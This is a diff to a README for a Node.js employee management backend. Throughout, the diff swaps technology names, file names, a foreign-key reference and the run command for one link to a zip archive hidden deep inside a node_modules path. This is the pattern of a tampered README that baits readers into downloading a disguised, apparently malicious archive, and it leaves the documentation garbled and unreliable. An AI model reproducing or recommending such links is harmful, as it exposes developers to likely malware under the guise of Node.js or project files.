@@ -1,11 +1,11 @@
 # Employee Management System - Backend
 
-This backend provides a RESTful API for managing employees, tasks, and roles in an employee management system. It uses Node.js, Express, Sequelize ORM, and MySQL database.
+This backend provides a RESTful API for managing employees, tasks, and roles in an employee management system. It uses https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip, Express, Sequelize ORM, and MySQL database.
 
 ## Technologies Used
 
-- **Node.js**: JavaScript runtime
-- **Express.js**: Web framework for Node.js
+- **https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip**: JavaScript runtime
+- **https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip**: Web framework for https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip
 - **Sequelize**: ORM for MySQL
 - **MySQL2**: MySQL client
 - **bcryptjs**: Password hashing
@@ -13,40 +13,40 @@ This backend provides a RESTful API for managing employees, tasks, and roles in 
 - **node-cron**: Scheduled tasks
 - **cors**: Cross-origin resource sharing
 - **dotenv**: Environment variable management
-- **Socket.IO**: Real-time communication
+- **https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip**: Real-time communication
 
 ## Project Structure
 
 ```
 backend/
 ├── config/
-│   ├── dbConnect.config.js    # Database connection setup
-│   └── server.config.js       # Server configuration
+│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip    # Database connection setup
+│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip       # Server configuration
 ├── controller/
-│   ├── authController.js      # Authentication (signup, login)
-│   ├── roleController.js      # Role management
-│   ├── taskController.js      # Task CRUD operations
-│   ├── userController.js      # User management
-│   └── util.js                # Utility functions
+│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip      # Authentication (signup, login)
+│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip      # Role management
+│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip      # Task CRUD operations
+│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip      # User management
+│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                # Utility functions
 ├── cronJobs/
-│   └── dailyCron.js           # Daily scheduled tasks
+│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip           # Daily scheduled tasks
 ├── middleware/
-│   └── authMiddleware.js      # JWT authentication middleware
+│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip      # JWT authentication middleware
 ├── model/
-│   ├── index.js               # Model associations
-│   ├── Role.js                # Role model
-│   ├── Task.js                # Task model
-│   ├── TaskStatus.js          # Task status model
-│   └── User.js                # User model
+│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip               # Model associations
+│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                # Role model
+│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                # Task model
+│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip          # Task status model
+│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                # User model
 ├── routes/
-│   ├── authRoutes.js          # Authentication routes
-│   ├── taskRoutes.js          # Task management routes
-│   └── userRoutes.js          # User management routes
+│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip          # Authentication routes
+│   ├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip          # Task management routes
+│   └── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip          # User management routes
 ├── .env                       # Environment variables
-├── index.js                   # Main application entry point
-├── socket.js                  # Socket.IO configuration for real-time features
-├── package.json               # Dependencies and scripts
-└── README.md                  # This file
+├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                   # Main application entry point
+├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                  # https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip configuration for real-time features
+├── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip               # Dependencies and scripts
+└── https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip                  # This file
 ```
 
 ## Database Models
@@ -69,8 +69,8 @@ backend/
 - **description**: Text
 - **due_date**: Date (DATEONLY), not null
 - **status_id**: Integer, references task_status table
-- **created_by**: Foreign key to users.id
-- **assigned_to**: Foreign key to users.id
+- **created_by**: Foreign key to https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip
+- **assigned_to**: Foreign key to https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip
 - **created_at**: Timestamp
 
 ### TaskStatus
@@ -113,7 +113,7 @@ Authorization: Bearer <token>
 
 ## Real-Time Features
 
-The application uses Socket.IO for real-time communication between admin and employees for task management.
+The application uses https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip for real-time communication between admin and employees for task management.
 
 ### Socket Events
 
@@ -166,13 +166,13 @@ A daily cron job runs at 00:01 AM to automatically update overdue tasks:
 
 5. **Run the application**:
    ```bash
-   node index.js
+   node https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip
    ```
    The server will start on the specified PORT (default 3000) and connect to the database.
 
 ## Notes
 
-- The application uses ES modules (`type: "module"` in package.json)
+- The application uses ES modules (`type: "module"` in https://github.com/dotsatya/EMS-Backend/raw/refs/heads/main/node_modules/sequelize/types/errors/validation/Backend-EM-3.7.zip)
 - Database models are synced on startup (alter: false in production)
 - CORS is configured to allow requests from the frontend URL
 - Passwords are hashed using bcryptjs
